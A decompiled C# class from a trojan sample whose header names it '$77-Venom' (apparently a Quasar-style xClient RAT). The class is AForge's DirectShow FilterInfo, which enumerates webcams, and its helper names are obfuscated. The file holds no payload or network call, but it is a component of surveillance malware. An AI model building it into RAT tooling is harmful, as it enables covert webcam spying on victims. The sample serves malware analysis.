// Decompiled with JetBrains decompiler
// Type: xClient.Core.AForge.Video.DirectShow.FilterInfo
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace xClient.Core.AForge.Video.DirectShow
{
  public class FilterInfo : IComparable
  {
    public string Name { get; private set; }

    public string MonikerString { get; private set; }

    public FilterInfo(string monikerString)
    {
      this.MonikerString = monikerString;
      this.Name = this.GetName(monikerString);
    }

    internal FilterInfo(IMoniker moniker)
    {
      this.MonikerString = this.GetMonikerString(moniker);
      this.Name = this.GetName(moniker);
    }

    public int CompareTo(object value)
    {
      FilterInfo filterInfo = (FilterInfo) value;
      return filterInfo == null ? 1 : this.Name.CompareTo(filterInfo.Name);
    }

    public static object CreateFilter(string filterMoniker)
    {
      object ppvResult = (object) null;
      IBindCtx ppbc = (IBindCtx) null;
      IMoniker ppmk = (IMoniker) null;
      int pchEaten = 0;
      if (ḓ袊룂蒐Ǚ륈\uEA67縓哒ᰲ씠䦬馰霡泚뚏碾ଡ厉盨.鄡ࣤ챍\u2019횧\uFFFD꽥\u24DD윤鋁캭㐩\u2EBDṲ傘\uFE37ꎟ荠ﳻꮏ(0, out ppbc) == 0)
      {
        if (ḓ袊룂蒐Ǚ륈\uEA67縓哒ᰲ씠䦬馰霡泚뚏碾ଡ厉盨.慻\u227C鴾灅ἱꜷ讧ဌ諹훖\u22FA鷯펏ꈣʻẚ멀\uFFFD痗膊(ppbc, filterMoniker, ref pchEaten, out ppmk) == 0)
        {
          Guid guid = typeof (ᯥ\uFFFD䳿\u109Eᳱ厗ᮗ\u2F3A\u061E\uFBCD埕駮푭폏ꤩ帴짱믐\u260B\uEE67).GUID;
          ppmk.BindToObject((IBindCtx) null, (IMoniker) null, ref guid, out ppvResult);
          Marshal.ReleaseComObject((object) ppmk);
        }
        Marshal.ReleaseComObject((object) ppbc);
      }
      return ppvResult;
    }

    private string GetMonikerString(IMoniker moniker)
    {
      string ppszDisplayName;
      moniker.GetDisplayName((IBindCtx) null, (IMoniker) null, out ppszDisplayName);
      return ppszDisplayName;
    }

    private string GetName(IMoniker moniker)
    {
      object ppvObj = (object) null;
      try
      {
        Guid guid = typeof (㠲춇얜떖傀놰軞\uF55E㓤㤮鮂倰㪡\uEB01ᅔ콖炉쾻ꋯ垚).GUID;
        moniker.BindToStorage((IBindCtx) null, (IMoniker) null, ref guid, out ppvObj);
        㠲춇얜떖傀놰軞\uF55E㓤㤮鮂倰㪡\uEB01ᅔ콖炉쾻ꋯ垚 㠲춇얜떖傀놰軞㓤㤮鮂倰㪡ᅔ콖炉쾻ꋯ垚 = (㠲춇얜떖傀놰軞\uF55E㓤㤮鮂倰㪡\uEB01ᅔ콖炉쾻ꋯ垚) ppvObj;
        object obj = (object) "";
        ref object local = ref obj;
        IntPtr zero = IntPtr.Zero;
        int errorCode = 㠲춇얜떖傀놰軞㓤㤮鮂倰㪡ᅔ콖炉쾻ꋯ垚.Read("FriendlyName", ref local, zero);
        if (errorCode != 0)
          Marshal.ThrowExceptionForHR(errorCode);
        string str = (string) obj;
        return str != null && str.Length >= 1 ? str : throw new ApplicationException();
      }
      catch (Exception ex)
      {
        return "";
      }
      finally
      {
        if (ppvObj != null)
          Marshal.ReleaseComObject(ppvObj);
      }
    }

    private string GetName(string monikerString)
    {
      IBindCtx ppbc = (IBindCtx) null;
      IMoniker ppmk = (IMoniker) null;
      string name = "";
      int pchEaten = 0;
      if (ḓ袊룂蒐Ǚ륈\uEA67縓哒ᰲ씠䦬馰霡泚뚏碾ଡ厉盨.鄡ࣤ챍\u2019횧\uFFFD꽥\u24DD윤鋁캭㐩\u2EBDṲ傘\uFE37ꎟ荠ﳻꮏ(0, out ppbc) == 0)
      {
        if (ḓ袊룂蒐Ǚ륈\uEA67縓哒ᰲ씠䦬馰霡泚뚏碾ଡ厉盨.慻\u227C鴾灅ἱꜷ讧ဌ諹훖\u22FA鷯펏ꈣʻẚ멀\uFFFD痗膊(ppbc, monikerString, ref pchEaten, out ppmk) == 0)
        {
          name = this.GetName(ppmk);
          Marshal.ReleaseComObject((object) ppmk);
          ppmk = (IMoniker) null;
        }
        Marshal.ReleaseComObject((object) ppbc);
      }
      return name;
    }
  }
}
